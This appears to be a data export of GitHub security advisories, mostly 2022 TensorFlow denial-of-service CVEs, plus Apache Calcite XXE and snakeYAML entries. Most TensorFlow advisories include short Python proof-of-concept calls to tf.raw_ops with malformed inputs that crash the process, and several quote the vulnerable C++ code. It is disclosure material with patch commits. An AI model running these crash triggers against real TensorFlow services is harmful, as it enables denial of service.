3093,20741,tensorflow,GHSA-qhw4-wwr7-gjc5,CVE-2022-35998,https://github.com/advisories/GHSA-qhw4-wwr7-gjc5,moderate,2022-09-16 22:09:57 UTC,TensorFlow vulnerable to `CHECK` fail in `EmptyTensorList`,"### Impact
If `EmptyTensorList` receives an input `element_shape` with more than one dimension, it gives a `CHECK` fail that can be used to trigger a denial of service attack.
```python
import tensorflow as tf

tf.raw_ops.EmptyTensorList(element_shape=tf.ones(dtype=tf.int32, shape=[1, 0]), max_num_elements=tf.constant(1),element_dtype=tf.int32)
```

### Patches
We have patched the issue in GitHub commit [c8ba76d48567aed347508e0552a257641931024d](https://github.com/tensorflow/tensorflow/commit/c8ba76d48567aed347508e0552a257641931024d).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Kang Hong Jin.
",pip
3094,20741,tensorflow,GHSA-fqxc-pvf8-2w9v,CVE-2022-36000,https://github.com/advisories/GHSA-fqxc-pvf8-2w9v,moderate,2022-09-16 22:09:36 UTC,TensorFlow vulnerable to null dereference on MLIR on empty function attributes,"### Impact
`Eig` can be fed an incorrect `Tout` input, resulting in a `CHECK` fail that can trigger a denial of service attack.
```python
import tensorflow as tf
import numpy as np 
arg_0=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)
arg_1=tf.complex128
arg_2=True
arg_3=''
tf.raw_ops.Eig(input=arg_0, Tout=arg_1, compute_v=arg_2, name=arg_3)
```

### Patches
We have patched the issue in GitHub commit [aed36912609fc07229b4d0a7b44f3f48efc00fd0](https://github.com/tensorflow/tensorflow/commit/aed36912609fc07229b4d0a7b44f3f48efc00fd0).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by 刘力源, Information System & Security and Countermeasures Experiments Center, Beijing Institute of Technology.
",pip
3095,20741,tensorflow,GHSA-jqm7-m5q7-3hm5,CVE-2022-36001,https://github.com/advisories/GHSA-jqm7-m5q7-3hm5,moderate,2022-09-16 22:08:58 UTC,TensorFlow vulnerable to `CHECK` fail in `DrawBoundingBoxes`,"### Impact
When `DrawBoundingBoxes` receives an input `boxes` that is not of dtype `float`, it gives a `CHECK` fail that can trigger a denial of service attack.
```python
import tensorflow as tf
import numpy as np
arg_0=tf.constant(value=np.random.random(size=(1, 3, 2, 3)), shape=(1, 3, 2, 3), dtype=tf.half)
arg_1=tf.constant(value=np.random.random(size=(1, 2, 4)), shape=(1, 2, 4), dtype=tf.float32)
arg_2=''
tf.raw_ops.DrawBoundingBoxes(images=arg_0, boxes=arg_1, name=arg_2)
```

### Patches
We have patched the issue in GitHub commit [da0d65cdc1270038e72157ba35bf74b85d9bda11](https://github.com/tensorflow/tensorflow/commit/da0d65cdc1270038e72157ba35bf74b85d9bda11).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by 刘力源, Information System & Security and Countermeasures Experiments Center, Beijing Institute of Technology.
",pip
3096,20741,tensorflow,GHSA-mh3m-62v7-68xg,CVE-2022-36002,https://github.com/advisories/GHSA-mh3m-62v7-68xg,moderate,2022-09-16 22:06:35 UTC,TensorFlow vulnerable to `CHECK` fail in `Unbatch`,"### Impact
When `Unbatch` receives a nonscalar input `id`, it gives a `CHECK` fail that can trigger a denial of service attack.
```python
import tensorflow as tf
import numpy as np
arg_0=tf.constant(value=np.random.random(size=(3, 3, 1)), dtype=tf.float64)
arg_1=tf.constant(value=np.random.randint(0,100,size=(3, 3, 1)), dtype=tf.int64)
arg_2=tf.constant(value=np.random.randint(0,100,size=(3, 3,  1)), dtype=tf.int64)
arg_3=47
arg_4=''
arg_5=''
tf.raw_ops.Unbatch(batched_tensor=arg_0, batch_index=arg_1, id=arg_2, 
                   timeout_micros=arg_3, container=arg_4, shared_name=arg_5)
```

### Patches
We have patched the issue in GitHub commit [4419d10d576adefa36b0e0a9425d2569f7c0189f](https://github.com/tensorflow/tensorflow/commit/4419d10d576adefa36b0e0a9425d2569f7c0189f).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by 刘力源, Information System & Security and Countermeasures Experiments Center, Beijing Institute of Technology.
",pip
3097,36292,org.apache.calcite:calcite-core,GHSA-fj2m-w3wv-x9pr,CVE-2022-39135,https://github.com/advisories/GHSA-fj2m-w3wv-x9pr,critical,2022-09-12 00:00:34 UTC,Apache Calcite before 1.32.0 vulnerable to potential XML External Entity (XXE) attack,"In Apache Calcite prior to version 1.32.0 the SQL operators EXISTS_NODE, EXTRACT_XML, XML_TRANSFORM and EXTRACT_VALUE do not restrict XML External Entity references in their configuration, which makes them vulnerable to a potential XML External Entity (XXE) attack. Therefore any client exposing these operators, typically by using Oracle dialect (the first three) or MySQL dialect (the last one), is affected by this vulnerability (the extent of it will depend on the user under which the application is running). From Apache Calcite 1.32.0 onwards, Document Type Declarations and XML External Entity resolution are disabled on the impacted operators.",maven
3098,20741,tensorflow,GHSA-828c-5j5q-vrjq,CVE-2022-36013,https://github.com/advisories/GHSA-828c-5j5q-vrjq,moderate,2022-09-16 22:01:12 UTC,TensorFlow vulnerable to null-dereference in `mlir::tfg::GraphDefImporter::ConvertNodeDef`,"### Impact
When [`mlir::tfg::GraphDefImporter::ConvertNodeDef`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/ir/importexport/graphdef_import.cc) tries to convert NodeDefs without an op name, it crashes.
```cpp
Status GraphDefImporter::ConvertNodeDef(OpBuilder &builder, ConversionState &s,
                                        const NodeDef &node) {
  VLOG(4) << ""Importing: "" << node.name();
  OperationState state(ConvertLocation(node), absl::StrCat(""tfg."", node.op()));

  // The GraphImporter does light shape inference, but here we will defer all of
  // that to the shape inference pass.
  const OpDef *op_def;
  const OpRegistrationData *op_reg_data = nullptr;
  if ((op_reg_data = registry_.LookUp(node.op()))) {
    op_def = &op_reg_data->op_def;
  } else {
    auto it = function_op_defs_.find(node.op());
    if (it == function_op_defs_.end())
      return InvalidArgument(""Unable to find OpDef for "", node.op());
    op_def = it->second;
  }
```
`node.op().empty()` cannot be empty.


### Patches
We have patched the issue in GitHub commit [a0f0b9a21c9270930457095092f558fbad4c03e5](https://github.com/tensorflow/tensorflow/commit/a0f0b9a21c9270930457095092f558fbad4c03e5).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
3099,20741,tensorflow,GHSA-fv43-93gv-vm8f,CVE-2022-36011,https://github.com/advisories/GHSA-fv43-93gv-vm8f,moderate,2022-09-16 21:59:08 UTC,TensorFlow vulnerable to null dereference on MLIR on empty function attributes,"### Impact
When [`mlir::tfg::ConvertGenericFunctionToFunctionDef`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/ir/importexport/functiondef_import.cc) is given empty function attributes, it gives a null dereference.
```cpp
// Import the function attributes with a `tf.` prefix to match the current
// infrastructure expectations.
for (const auto& namedAttr : func.attr()) {
  const std::string& name = ""tf."" + namedAttr.first;
  const AttrValue& tf_attr = namedAttr.second;
  TF_ASSIGN_OR_RETURN(Attribute attr,
                      ConvertAttributeValue(tf_attr, builder, tfgDialect));
  attrs.append(name, attr);
}
```
If `namedAttr.first` is empty, it will crash.

### Patches
We have patched the issue in GitHub commit [1cf45b831eeb0cab8655c9c7c5d06ec6f45fc41b](https://github.com/tensorflow/tensorflow/commit/1cf45b831eeb0cab8655c9c7c5d06ec6f45fc41b).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
",pip
3100,20741,tensorflow,GHSA-wqmc-pm8c-2jhc,CVE-2022-36017,https://github.com/advisories/GHSA-wqmc-pm8c-2jhc,moderate,2022-09-16 21:57:05 UTC,TensorFlow vulnerable to segfault in `Requantize`,"### Impact
If `Requantize` is given `input_min`, `input_max`, `requested_output_min`, `requested_output_max` tensors of a nonzero rank, it results in a segfault that can be used to trigger a denial of service attack.
```python
import tensorflow as tf

out_type = tf.quint8
input = tf.constant([1], shape=[3], dtype=tf.qint32)
input_min = tf.constant([], shape=[0], dtype=tf.float32)
input_max = tf.constant(-256, shape=[1], dtype=tf.float32)
requested_output_min = tf.constant(-256, shape=[1], dtype=tf.float32)
requested_output_max = tf.constant(-256, shape=[1], dtype=tf.float32)
tf.raw_ops.Requantize(input=input, input_min=input_min, input_max=input_max, requested_output_min=requested_output_min, requested_output_max=requested_output_max, out_type=out_type)
```

### Patches
We have patched the issue in GitHub commit [785d67a78a1d533759fcd2f5e8d6ef778de849e0](https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.
",pip
3101,20741,tensorflow,GHSA-cv2p-32v3-vhwq,CVE-2022-36003,https://github.com/advisories/GHSA-cv2p-32v3-vhwq,moderate,2022-09-16 21:39:10 UTC,TensorFlow vulnerable to `CHECK` fail in `RandomPoissonV2`,"### Impact
When `RandomPoissonV2` receives large input shape and rates, it gives a `CHECK` fail that can trigger a denial of service attack.
```python
import tensorflow as tf
arg_0=tf.random.uniform(shape=(4,), dtype=tf.int32, maxval=65536)
arg_1=tf.random.uniform(shape=(4, 4, 4, 4, 4), dtype=tf.float32, maxval=None)
arg_2=0
arg_3=0
arg_4=tf.int32
arg_5=None
tf.raw_ops.RandomPoissonV2(shape=arg_0, rate=arg_1, seed=arg_2,
                           seed2=arg_3, dtype=arg_4, name=arg_5)
```

### Patches
We have patched the issue in GitHub commit [552bfced6ce4809db5f3ca305f60ff80dd40c5a3](https://github.com/tensorflow/tensorflow/commit/552bfced6ce4809db5f3ca305f60ff80dd40c5a3).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by 刘力源, Information System & Security and Countermeasures Experiments Center, Beijing Institute of Technology.
",pip
3102,20741,tensorflow,GHSA-r26c-679w-mrjm,CVE-2022-36005,https://github.com/advisories/GHSA-r26c-679w-mrjm,moderate,2022-09-16 21:28:06 UTC,TensorFlow vulnerable to `CHECK` fail in `FakeQuantWithMinMaxVarsGradient`,"### Impact
When `tf.quantization.fake_quant_with_min_max_vars_gradient` receives input `min` or `max` that is nonscalar, it gives a `CHECK` fail that can trigger a denial of service attack.
```python
import tensorflow as tf
import numpy as np 
arg_0=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)
arg_1=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)
arg_2=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)
arg_3=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)
arg_4=8
arg_5=False
arg_6=''
tf.quantization.fake_quant_with_min_max_vars_gradient(gradients=arg_0, inputs=arg_1,
min=arg_2, max=arg_3, num_bits=arg_4, narrow_range=arg_5, name=arg_6)
```

### Patches
We have patched the issue in GitHub commit [f3cf67ac5705f4f04721d15e485e192bb319feed](https://github.com/tensorflow/tensorflow/commit/f3cf67ac5705f4f04721d15e485e192bb319feed).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by
 - 刘力源, Information System & Security and Countermeasures Experiments Center, Beijing Institute of Technology
 - Neophytos Christou, Secure Systems Labs, Brown University
",pip
3103,20741,tensorflow,GHSA-g9h5-vr8m-x2h4,CVE-2022-35995,https://github.com/advisories/GHSA-g9h5-vr8m-x2h4,moderate,2022-09-16 21:25:53 UTC,TensorFlow vulnerable to `CHECK` fail in `AudioSummaryV2`,"### Impact
When `AudioSummaryV2` receives an input `sample_rate` with more than one element, it gives a `CHECK` fails that can be used to trigger a denial of service attack.
```python
import tensorflow as tf
arg_0=''
arg_1=tf.random.uniform(shape=(1,1), dtype=tf.float32, maxval=None)
arg_2=tf.random.uniform(shape=(2,1), dtype=tf.float32, maxval=None)
arg_3=3
arg_4=''
tf.raw_ops.AudioSummaryV2(tag=arg_0, tensor=arg_1, sample_rate=arg_2,
                          max_outputs=arg_3, name=arg_4)
```

### Patches
We have patched the issue in GitHub commit [bf6b45244992e2ee543c258e519489659c99fb7f](https://github.com/tensorflow/tensorflow/commit/bf6b45244992e2ee543c258e519489659c99fb7f).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by 刘力源, Information System & Security and Countermeasures Experiments Center, Beijing Institute of Technology.
",pip
3104,20741,tensorflow,GHSA-mv8m-8x97-937q,CVE-2022-36004,https://github.com/advisories/GHSA-mv8m-8x97-937q,moderate,2022-09-16 21:23:11 UTC,TensorFlow vulnerable to `CHECK` fail in `tf.random.gamma`,"### Impact
When `tf.random.gamma` receives large input shape and rates, it gives a `CHECK` fail that can trigger a denial of service attack.
```python
import tensorflow as tf
arg_0=tf.random.uniform(shape=(4,), dtype=tf.int32, maxval=65536)
arg_1=tf.random.uniform(shape=(4, 4), dtype=tf.float64, maxval=None)
arg_2=tf.random.uniform(shape=(4, 4, 4, 4, 4), dtype=tf.float64, maxval=None)
arg_3=tf.float64
arg_4=48
arg_5='None'
tf.random.gamma(shape=arg_0, alpha=arg_1, beta=arg_2, dtype=arg_3, seed=arg_4, name=arg_5)
```

### Patches
We have patched the issue in GitHub commit [552bfced6ce4809db5f3ca305f60ff80dd40c5a3](https://github.com/tensorflow/tensorflow/commit/552bfced6ce4809db5f3ca305f60ff80dd40c5a3).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by 刘力源, Information System & Security and Countermeasures Experiments Center, Beijing Institute of Technology.
",pip
3105,20741,tensorflow,GHSA-g468-qj8g-vcjc,CVE-2022-36016,https://github.com/advisories/GHSA-g468-qj8g-vcjc,low,2022-09-16 21:22:51 UTC,TensorFlow vulnerable to `CHECK`-fail in `tensorflow::full_type::SubstituteFromAttrs`,"### Impact
When [`tensorflow::full_type::SubstituteFromAttrs`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/ops/math_ops.cc) receives a `FullTypeDef& t` that is not exactly three args, it triggers a `CHECK`-fail instead of returning a status.
```cpp
Status SubstituteForEach(AttrMap& attrs, FullTypeDef& t) {
  DCHECK_EQ(t.args_size(), 3);

  const auto& cont = t.args(0);
  const auto& tmpl = t.args(1);
  const auto& t_var = t.args(2);
```

### Patches
We have patched the issue in GitHub commit [6104f0d4091c260ce9352f9155f7e9b725eab012](https://github.com/tensorflow/tensorflow/commit/6104f0d4091c260ce9352f9155f7e9b725eab012).
The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
",pip
3106,20741,tensorflow,GHSA-7j3m-8g3c-9qqq,CVE-2022-36014,https://github.com/advisories/GHSA-7j3m-8g3c-9qqq,moderate,2022-09-16 21:20:58 UTC,TensorFlow vulnerable to null-dereference in `mlir::tfg::TFOp::nameAttr`,"### Impact
When [`mlir::tfg::TFOp::nameAttr`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/ir/importexport/graphdef_import.cc) receives null type list attributes, it crashes.
```cpp

StatusOr<unsigned> GraphDefImporter::ArgNumType(const NamedAttrList &attrs,
                                                const OpDef::ArgDef &arg_def,
                                                SmallVectorImpl<Type> &types) {
  // Check whether a type list attribute is specified.
  if (!arg_def.type_list_attr().empty()) {
    if (auto v = attrs.get(arg_def.type_list_attr()).dyn_cast<ArrayAttr>()) {
      for (Attribute attr : v) {
        if (auto dtype = attr.dyn_cast<TypeAttr>()) {
          types.push_back(UnrankedTensorType::get(dtype.getValue()));
        } else {
          return InvalidArgument(""Expected '"", arg_def.type_list_attr(),
                                 ""' to be a list of types"");
        }
      }
      return v.size();
    }
    return NotFound(""Type attr not found: "", arg_def.type_list_attr());
  }

  unsigned num = 1;
  // Check whether a number attribute is specified.
  if (!arg_def.number_attr().empty()) {
    if (auto v = attrs.get(arg_def.number_attr()).dyn_cast<IntegerAttr>()) {
      num = v.getValue().getZExtValue();
    } else {
      return NotFound(""Type attr not found: "", arg_def.number_attr());
    }
  }

  // Check for a type or type attribute.
  Type dtype;
  if (arg_def.type() != DataType::DT_INVALID) {
    TF_RETURN_IF_ERROR(ConvertDataType(arg_def.type(), b_, &dtype));
  } else if (arg_def.type_attr().empty()) {
    return InvalidArgument(""Arg '"", arg_def.name(),
                           ""' has invalid type and no type attribute"");
  } else {
    if (auto v = attrs.get(arg_def.type_attr()).dyn_cast<TypeAttr>()) {
      dtype = v.getValue();
    } else {
      return NotFound(""Type attr not found: "", arg_def.type_attr());
    }
  }
  types.append(num, UnrankedTensorType::get(dtype));
  return num;
}
```


### Patches
We have patched the issue in GitHub commits [3a754740d5414e362512ee981eefba41561a63a6](https://github.com/tensorflow/tensorflow/commit/3a754740d5414e362512ee981eefba41561a63a6) and [a0f0b9a21c9270930457095092f558fbad4c03e5](https://github.com/tensorflow/tensorflow/commit/a0f0b9a21c9270930457095092f558fbad4c03e5).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
",pip
3107,20741,tensorflow,GHSA-rh87-q4vg-m45j,CVE-2022-36015,https://github.com/advisories/GHSA-rh87-q4vg-m45j,low,2022-09-16 21:20:28 UTC,TensorFlow vulnerable to integer overflow in math ops,"### Impact
When [`RangeSize`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/ops/math_ops.cc) receives values that do not fit into an `int64_t`, it crashes.
```cpp
  auto size = (std::is_integral<T>::value
                   ? ((Eigen::numext::abs(limit - start) +
                       Eigen::numext::abs(delta) - T(1)) /
                      Eigen::numext::abs(delta))
                   : (Eigen::numext::ceil(
                         Eigen::numext::abs((limit - start) / delta))));

  // This check does not cover all cases.
  if (size > std::numeric_limits<int64_t>::max()) {
    return errors::InvalidArgument(""Requires ((limit - start) / delta) <= "",
                                   std::numeric_limits<int64_t>::max());
  }

  c->set_output(0, c->Vector(static_cast<int64_t>(size)));
  return Status::OK();
}
```

### Patches
We have patched the issue in GitHub commit [37e64539cd29fcfb814c4451152a60f5d107b0f0](https://github.com/tensorflow/tensorflow/commit/37e64539cd29fcfb814c4451152a60f5d107b0f0).
The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
",pip
3108,20741,tensorflow,GHSA-jvhc-5hhr-w3v5,CVE-2022-36012,https://github.com/advisories/GHSA-jvhc-5hhr-w3v5,moderate,2022-09-16 21:19:48 UTC,TensorFlow vulnerable to assertion fail on MLIR empty edge names,"### Impact
When [`mlir::tfg::ConvertGenericFunctionToFunctionDef`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/ir/importexport/functiondef_import.cc) is given empty function attributes, it crashes.
```cpp
// We pre-allocate the array of operands and populate it using the
// `output_name_to_position` and `control_output_to_position` populated
// previously.
SmallVector<Value> ret_vals(func.ret_size() + func.control_ret_size(),
                            Value());
for (const auto& ret_val : func.ret()) {
  auto position = output_name_to_position.find(ret_val.first);
  if (position == output_name_to_position.end())
    return InvalidArgument(
        ""Can't import function, returned value references unknown output ""
        ""argument "",
        ret_val.first);
  ret_vals[position->second] =
      value_manager.GetValueOrCreatePlaceholder(ret_val.second);
}
for (const auto& ret_val : func.control_ret()) {
  auto position = control_output_to_position.find(ret_val.first);
  if (position == control_output_to_position.end())
    return InvalidArgument(
        ""Can't import function, returned value references unknown output ""
        ""argument "",
        ret_val.first);
  Value result = value_manager.GetValueOrCreatePlaceholder(
      (Twine(""^"") + ret_val.second).str());
```
`ret_val.second` cannot be empty. Neither can `input`.
```cpp
// Process every node and create a matching MLIR operation
for (const NodeDef& node : nodes) {
  if (node.op().empty()) return InvalidArgument(""empty op type"");
  OperationState state(unknown_loc, absl::StrCat(""tfg."", node.op()));
  // Fetch the inputs, creating placeholder if an input hasn't been visited.
  for (const std::string& input : node.input())
    state.operands.push_back(
        value_manager.GetValueOrCreatePlaceholder(input));
```


### Patches
We have patched the issue in GitHub commit [ad069af92392efee1418c48ff561fd3070a03d7b](https://github.com/tensorflow/tensorflow/commit/ad069af92392efee1418c48ff561fd3070a03d7b).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
",pip
3109,20741,tensorflow,GHSA-w62h-8xjm-fv49,CVE-2022-35987,https://github.com/advisories/GHSA-w62h-8xjm-fv49,moderate,2022-09-16 21:19:15 UTC,TensorFlow vulnerable to `CHECK` fail in `DenseBincount`,"### Impact
`DenseBincount` assumes its input tensor `weights` to either have the same shape as its input tensor `input` or to be length-0. A different `weights` shape will trigger a `CHECK` fail that can be used to trigger a denial of service attack.
```python
import tensorflow as tf
binary_output = True
input = tf.random.uniform(shape=[0, 0], minval=-10000, maxval=10000, dtype=tf.int32, seed=-2460)
size = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-10000)
weights = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.float32, seed=-10000)
tf.raw_ops.DenseBincount(input=input, size=size, weights=weights, binary_output=binary_output)
```

### Patches
We have patched the issue in GitHub commit [bf4c14353c2328636a18bfad1e151052c81d5f43](https://github.com/tensorflow/tensorflow/commit/bf4c14353c2328636a18bfad1e151052c81d5f43).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University
",pip
3110,20741,tensorflow,GHSA-mgmh-g2v6-mqw5,CVE-2022-35941,https://github.com/advisories/GHSA-mgmh-g2v6-mqw5,moderate,2022-09-16 21:18:42 UTC,TensorFlow vulnerable to `CHECK` failure in `AvgPoolOp`,"### Impact
The [`AvgPoolOp`](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/avgpooling_op.cc#L56-L98) function takes an argument `ksize` that must be positive but is not checked. A negative `ksize` can trigger a `CHECK` failure and crash the program.
```python
import tensorflow as tf
import numpy as np

value = np.ones([1, 1, 1, 1])
ksize = [1, 1e20, 1, 1]
strides = [1, 1, 1, 1]
padding = 'SAME'
data_format = 'NHWC'

tf.raw_ops.AvgPool(value=value, ksize=ksize, strides=strides, padding=padding, data_format=data_format)
```

### Patches
We have patched the issue in GitHub commit [3a6ac52664c6c095aa2b114e742b0aa17fdce78f](https://github.com/tensorflow/tensorflow/commit/3a6ac52664c6c095aa2b114e742b0aa17fdce78f).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Jingyi Shi.
",pip
3111,34007,org.yaml:snakeyaml,GHSA-hhhw-99gj-p3c3,CVE-2022-38750,https://github.com/advisories/GHSA-hhhw-99gj-p3c3,moderate,2022-09-06 00:00:27 UTC,snakeYAML before 1.31 vulnerable to Denial of Service due to Out-of-bounds Write,"Using snakeYAML to parse untrusted YAML files may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stackoverflow.",maven
3112,20741,tensorflow,GHSA-9cr2-8pwr-fhfq,CVE-2022-36026,https://github.com/advisories/GHSA-9cr2-8pwr-fhfq,moderate,2022-09-16 21:15:36 UTC,TensorFlow vulnerable to `CHECK` fail in `QuantizeAndDequantizeV3`,"### Impact
If `QuantizeAndDequantizeV3` is given a nonscalar `num_bits` input tensor, it results in a `CHECK` fail that can be used to trigger a denial of service attack.
```python
import tensorflow as tf

signed_input = True
range_given = False
narrow_range = False
axis = -1
input = tf.constant(-3.5, shape=[1], dtype=tf.float32)
input_min = tf.constant(-3.5, shape=[1], dtype=tf.float32)
input_max = tf.constant(-3.5, shape=[1], dtype=tf.float32)
num_bits = tf.constant([], shape=[0], dtype=tf.int32)
tf.raw_ops.QuantizeAndDequantizeV3(input=input, input_min=input_min, input_max=input_max, num_bits=num_bits, signed_input=signed_input, range_given=range_given, narrow_range=narrow_range, axis=axis)
```

### Patches
We have patched the issue in GitHub commit [f3f9cb38ecfe5a8a703f2c4a8fead434ef291713](https://github.com/tensorflow/tensorflow/commit/f3f9cb38ecfe5a8a703f2c4a8fead434ef291713).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.",pip
3113,20741,tensorflow,GHSA-m6cv-4fmf-66xf,CVE-2022-36018,https://github.com/advisories/GHSA-m6cv-4fmf-66xf,moderate,2022-09-16 21:14:10 UTC,TensorFlow vulnerable to `CHECK` fail in `RaggedTensorToVariant`,"### Impact
If `RaggedTensorToVariant` is given a `rt_nested_splits` list that contains tensors of ranks other than one, it results in a `CHECK` fail that can be used to trigger a denial of service attack.
```python
import tensorflow as tf

batched_input = True
rt_nested_splits = tf.constant([0,32,64], shape=[3], dtype=tf.int64)
rt_dense_values = tf.constant([0,32,64], shape=[3], dtype=tf.int64)
tf.raw_ops.RaggedTensorToVariant(rt_nested_splits=rt_nested_splits, rt_dense_values=rt_dense_values, batched_input=batched_input)
```

### Patches
We have patched the issue in GitHub commit [88f93dfe691563baa4ae1e80ccde2d5c7a143821](https://github.com/tensorflow/tensorflow/commit/88f93dfe691563baa4ae1e80ccde2d5c7a143821).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
